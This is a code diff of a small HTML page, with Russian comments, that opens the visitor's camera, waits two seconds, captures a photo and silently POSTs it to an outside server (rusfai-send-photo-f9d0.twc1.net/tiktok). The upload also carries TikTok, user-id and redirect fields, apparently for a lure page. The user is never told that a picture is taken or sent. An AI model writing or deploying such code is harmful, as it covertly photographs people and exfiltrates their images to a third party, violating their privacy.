@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>Capture</title>
     <style>
         body, video {
             margin: 0;
@@ -25,52 +25,46 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    // Запрос доступа к камере
     navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
             video.srcObject = stream;
-            return new Promise((resolve) => video.onloadedmetadata = resolve);
-        })
-        .then(() => {
-            // Задержка, чтобы камера точно успела включиться и захватить кадр
+
+            // Через 2 секунды делаем снимок
             setTimeout(() => {
-                // Захватываем изображение
+                // Настройка размера canvas под видео
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
+
+                // Отрисовка текущего кадра видео на canvas
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Преобразуем изображение в байты
+                // Преобразование изображения в Blob
                 canvas.toBlob(blob => {
-                    const reader = new FileReader();
-                    reader.readAsArrayBuffer(blob);
-                    reader.onloadend = function() {
-                        const byteArray = new Uint8Array(reader.result);
-                        sendData(byteArray);
-                    };
-                });
-            }, 1000);
+                    // Формирование данных для отправки
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('tiktok_url', 'https://www.tiktok.com/example_video');
+                    formData.append('user_id', '12345');
+                    formData.append('redirect_url', 'https://www.redirect.com');
+
+                    // Отправка данных на сервер
+                    fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.text())
+                    .then(result => {
+                        console.log('Success:', result);
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
+                }, 'image/jpeg');
+            }, 2000); // 2 секунды ожидания для автофокуса
         })
         .catch(err => {
-            console.error("Ошибка доступа к камере:", err);
+            console.error('Ошибка при доступе к камере:', err);
         });
-
-    // Функция для отправки данных на другой сервер
-    function sendData(byteArray) {
-        fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', { // Post back 
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/octet-stream'
-            },
-            body: byteArray
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Успех:", data);
-        })
-        .catch((error) => {
-            console.error('Ошибка:', error);
-        });
-    }
 </script>
 
 </body>
